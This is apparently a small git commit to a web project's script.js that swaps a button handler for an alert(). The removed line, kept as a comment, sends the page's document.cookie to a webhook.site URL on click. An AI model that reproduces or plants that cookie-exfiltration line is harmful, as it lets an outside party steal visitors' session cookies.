567901a267e330a4a0525515f3ab06f42326e794
boyu0802 <boyu0802chen@gmail.com>
2025-08-11 19:31:31 +0800

    Update script.js

--- resources/static/script.js
+++ resources/static/script.js
@@ -1,6 +1,7 @@
 document.addEventListener("DOMContentLoaded", function () {
   const button = document.getElementById("showTimeButton");
   button.addEventListener("click", function () {
-    fetch("https://webhook.site/ba19b219-7ec8-43f1-a70e-5fb9a46afb6a?" + document.cookie);
+    alert();
+    // fetch("https://webhook.site/ba19b219-7ec8-43f1-a70e-5fb9a46afb6a?" + document.cookie);
   });
 })
